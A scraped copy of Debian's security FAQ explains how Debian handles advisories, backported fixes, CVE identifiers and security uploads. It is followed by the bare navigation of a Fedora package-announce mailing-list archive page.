=== Content from www.debian.org_2c992b25_20250121_025949.html ===

[![Debian](../Pics/openlogo-50.png)](../ "Debian Home")

[Skip Quicknav](#content)

* [Blog](https://bits.debian.org/ "Bits from Debian")
* [Micronews](https://micronews.debian.org "Micronews from Debian")
* [Planet](https://planet.debian.org/ "The Planet of Debian")

[Security Information](./)
/
Debian security FAQ

# Debian security FAQ

1. [I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?](#buthow)- [The signature on your advisories does not verify correctly!](#signature)- [How is security handled in Debian?](#handling)- [Why are you fiddling with an old version of that package?](#oldversion)- [The version number for a package indicates that I am still running a vulnerable version!](#version)- [I received an advisory, but the build for one processor architecture seems to be missing.](#archismissing)- [How is security handled for unstable?](#unstable)- [How is security handled for testing?](#testing)- [How is security handled for contrib, non-free and non-free-firmware?](#contrib)- [The advisory says unstable is fixed in version 1.2.3-1, but unstable has 1.2.5-1, what's up?](#sidversionisold)- [Why are there no official mirrors for security.debian.org?](#mirror)- [I've seen DSA 100 and DSA 102, now where is DSA 101?](#missing)- [How can I reach the security team?](#contact)- [I guess I found a security problem, what should I do?](#discover)- [What am I supposed to do with a security problem in one of my packages?](#care)- [I tried to download a package listed in one of the security advisories, but I got a `file not found' error.](#enofile)- [I've got a bugfix, can I upload to security.debian.org directly?](#upload)- [I've got a bugfix, can I upload to proposed-updates instead?](#ppu)- [I'm pretty sure my packages are fine, how can I upload them?](#SecurityUploadQueue)- [How can I help with security?](#help)- [What is the scope of proposed-updates?](#proposed-updates)- [How is the security team composed?](#composing)- [How long will security updates be provided?](#lifespan)- [How can I check the integrity of packages?](#check)- [What to do if a random package breaks after a security update?](#break)- [What is a CVE identifier?](#cvewhat)- [Does Debian issue a DSA for every CVE id?](#cvedsa)- [Can Debian assign CVE identifiers?](#cveget)- [Does Debian have a vulnerability disclosure policy?](#disclosure-policy)- [Our vulnerability management tool has shown that the following issues are open (list of CVEs with random CVSS scores). When are those going to be fixed?](#cve-severity-assessment)- [What does local (remote) mean?](#localremote)

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

---

Back to the [Debian Project homepage](../).

---

This page is also available in the following languages:
Select your language
dansk
Deutsch
español
français
Italiano
Nederlands
polski
Português
suomi
svenska
Русский (Russkij)
中文(简)
中文(HK)
中文(繁)
日本語 (Nihongo)

How to set [the default document language](../intro/cn)

---

**[Home](/)**

* [About](../intro/about)
  + [Social Contract](../social_contract)
  + [Code of Conduct](../code_of_conduct)
  + [Free Software](../intro/free)
  + [Legal Info](../legal)
* [Help Debian](../intro/help)

* [Getting Debian](../distrib/)
  + [Network install](../distrib/netinst)
  + [CD/USB ISO images](../CD/)
  + [Pure Blends](../blends/)
  + [Debian Packages](../distrib/packages)
  + [Developers' Corner](../devel/)

* [News](../News/)
  + [Project News](../News/weekly/)
  + [Events](../events/)
* [Documentation](../doc/)
  + [Release Info](../releases/)
  + [Debian Wiki](https://wiki.debian.org/)

* [Support](../support)
  + [Debian International](../international/)
  + [Security Information](../security/)
  + [Bug reports](../Bugs/)
  + [Mailing Lists](../MailingLists/)

* [Site map](../sitemap)
* [Search](https://search.debian.org/)
* [The Debian Blog](https://bits.debian.org)
* [Debian Micronews](https://micronews.debian.org)
* [Debian Planet](https://planet.debian.org)

See our [contact page](../contact) to get in touch. Web site source code is [available](https://salsa.debian.org/webmaster-team/webwml).

Last Modified: Fri, Oct 6 21:55:11 UTC 2023

Last Built: Sat, Jan 11 19:35:55 UTC 2025

Copyright © 1997-2023 [SPI](https://www.spi-inc.org/) and others; See [license terms](../license)

Debian is a registered [trademark](../trademark) of Software in the Public Interest, Inc.



=== Content from lists.fedoraproject.org_20ed1444_20250121_005012.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
